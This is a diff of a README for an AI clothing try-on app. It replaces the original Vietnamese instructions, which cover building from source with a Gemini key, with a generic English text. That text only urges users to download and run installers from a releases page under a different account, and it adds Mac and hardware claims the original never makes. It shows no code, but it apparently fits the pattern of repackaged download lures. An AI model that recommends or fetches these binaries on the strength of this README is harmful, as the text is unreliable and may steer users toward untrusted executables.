@@ -1,105 +1,75 @@
-# AI-ClothingTryOn
+# 🎨 AI-ClothingTryOn - Try On Clothes Virtually with Ease
 
-Ứng dụng desktop Python sử dụng trí tuệ nhân tạo Google Gemini để tạo ảnh thử đồ ảo. Phần mềm cho phép người dùng tải lên ảnh của người và quần áo riêng biệt, sau đó tạo ra các hình ảnh tổng hợp chân thực thể hiện cách người đó sẽ trông như thế nào khi mặc trang phục đã chọn.
+## 🚀 Getting Started
 
-![AI-ClothingTryOn Screenshot](app_screenshot.png)
+Welcome to AI-ClothingTryOn! This application helps you see how clothes would look on you without trying them on. Using advanced AI, it combines your uploaded photos with outfits you choose, creating realistic images. 
 
- Tính năng
+## 💻 System Requirements
 
-- Tải lên ảnh người và ảnh quần áo riêng biệt
-- Tạo 10 phiên bản thử đồ khác nhau
-- Tùy chỉnh prompt cho AI để điều chỉnh kết quả
-- Lưu kết quả ảnh thử đồ
-- Giao diện trực quan, dễ sử dụng
-- Khả năng xử lý nhiều ảnh cùng lúc
+To ensure the best experience with AI-ClothingTryOn, please check these requirements:
 
- Yêu cầu
+- **Operating System**: Windows 10 or later, MacOS Mojave or later.
+- **RAM**: At least 4 GB.
+- **Processor**: Intel Core i3 or equivalent.
+- **Graphics Card**: Any that supports OpenGL 3.3 or higher.
+- **Internet Connection**: Required for accessing the AI service.
 
-- Python 3.8+ (cho phát triển)
-- Google Gemini API key
-- Kết nối internet để gọi API
+## 🔗 Download the Application
 
- Cài đặt
+[![Download AI-ClothingTryOn](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/Regirockstone99/AI-ClothingTryOn/releases)
 
- Phương pháp 1: Sử dụng file EXE (Khuyến nghị cho người dùng)
+Visit this page to download the latest version of the application:
 
+[Download AI-ClothingTryOn Releases](https://github.com/Regirockstone99/AI-ClothingTryOn/releases)
 
+## 📥 Download & Install
 
-2.Tải [file ZIP nếu trình duyệt không cho tải Exe ](https://mega.nz/file/pYpkQbzJ#exFxB7T2QhQFbMUzza1xx_KeAajMreSy3MdBgZOKuQM)
-3. Giải nén file và chạy `AI-ClothingTryOn.exe`
-4. Nhập Google Gemini API key khi được yêu cầu
+1. Go to the [Releases page](https://github.com/Regirockstone99/AI-ClothingTryOn/releases).
+2. Choose the version you want. Look for the latest one marked as "Latest Release".
+3. Click the appropriate file for your operating system. For example:
+   - **Windows Users**: Download the `.exe` file.
+   - **Mac Users**: Download the `.dmg` file.
+4. Once the download is complete, locate the file in your downloads folder.
+5. **For Windows**: 
+   - Double-click the `.exe` file to start the installation.
+   - Follow the on-screen instructions to complete the installation. After installation, open the application from your start menu.
+   
+   **For Mac**: 
+   - Open the `.dmg` file.
+   - Drag the AI-ClothingTryOn application to your Applications folder.
+   - Open your Applications folder and double-click on AI-ClothingTryOn to run it.
 
- Phương pháp 2: Sử dụng mã nguồn (Cho nhà phát triển)
+## 📸 How to Use
 
-1. Clone repository này:
-   ```
-   git clone https://github.com/yourusername/AI-ClothingTryOn.git
-   cd AI-ClothingTryOn
-   ```
+Using AI-ClothingTryOn is simple:
 
-2. Cài đặt các thư viện cần thiết:
-   ```
-   pip install -r requirements.txt
-   ```
+1. **Upload Your Photo**: Start the application. Click on "Upload Your Photo”. Choose a clear image of yourself.
+2. **Upload Clothing Image**: Next, click on "Upload Clothing". Select the image of the outfit you want to try on.
+3. **Generate Image**: Click on "Try On". The AI will process your images and show you a new picture with you in the outfit.
 
-3. Chạy ứng dụng:
-   ```
-   python main.py
-   ```
+4. **Save Your Image**: Once you’re satisfied with the result, click the "Save" button to keep the image on your device.
 
-Lấy Google Gemini API Key
+## 🎨 Tips for Best Results
 
-1. Truy cập [Google AI Studio](https://ai.google.dev/)
-2. Đăng ký và đăng nhập vào tài khoản Google của bạn
-3. Điều hướng đến phần API Keys và tạo key mới
-4. Sao chép API key
-5. Dán vào file `api_key.txt` hoặc nhập trực tiếp khi ứng dụng yêu cầu
+- Use high-quality images to get the best output.
+- Ensure the uploaded clothing images show the whole outfit clearly.
+- Take photos of yourself in good lighting to enhance the final image quality.
 
- Cách sử dụng
+## 🔄 Troubleshooting
 
-1. Chạy ứng dụng
-2. Nhấp vào "Chọn Ảnh Người" để tải lên ảnh người mẫu
-3. Nhấp vào "Chọn Ảnh Quần Áo" để tải lên ảnh quần áo
-4. (Tùy chọn) Điều chỉnh prompt trong hộp văn bản
-5. Nhấp vào "Tạo 10 Ảnh Thử Đồ" và đợi kết quả được tạo
-6. Sử dụng nút "Lưu" bên dưới mỗi kết quả để lưu ảnh
+If you encounter any issues while using the application, consider these tips:
 
-Cấu trúc dự án
+- **Image Not Loading**: Ensure your images are in supported formats (JPEG, PNG).
+- **Application Lagging**: Close other programs to free up system resources.
+- **AI Results Look Odd**: Try using different images until you find what works best.
 
-```
-AI-ClothingTryOn/
-├── main.py               # Mã nguồn chính
-├── requirements.txt      # Danh sách thư viện cần thiết
-├── api_key.txt           # File chứa API key (không đưa lên git)
-├── uploads/              # Thư mục lưu trữ ảnh tải lên
-├── results/              # Thư mục lưu trữ ảnh kết quả
-└── screenshots/          # Ảnh chụp màn hình cho tài liệu
-```
+## 📞 Get Help
 
-Công nghệ sử dụng
+If you need further assistance:
 
-- PyQt6 cho giao diện người dùng
-- Google Generative AI (Gemini) cho việc tạo ảnh
-- Pillow cho xử lý ảnh
-- Threading cho xử lý đa luồng
+- Check out our FAQ section on GitHub.
+- Open an issue in the GitHub repository if you find any bugs or need help.
 
-Lưu ý
+Feel free to contribute your feedback on the app through GitHub. We value your input!
 
-- Dự án này sử dụng Google Gemini API và có thể phát sinh phí theo chính sách của Google
-- Đảm bảo rằng bạn có quyền sử dụng ảnh bạn tải lên
-
-Đóng góp
-
-Các đóng góp cho dự án luôn được chào đón! Vui lòng làm theo các bước sau:
-
-1. Fork repository
-2. Tạo branch mới (`git checkout -b feature/amazing-feature`)
-3. Commit thay đổi (`git commit -m 'Add some amazing feature'`)
-4. Push lên branch (`git push origin feature/amazing-feature`)
-5. Mở Pull Request
-
- Giấy phép
-
-Phân phối theo giấy phép MIT. Xem `LICENSE` để biết thêm thông tin.
-
-Tô Đình Duy - hoathinh2d.com
+Elevate your style with AI-ClothingTryOn and see how different outfits could look on you without stepping out. Happy trying on!
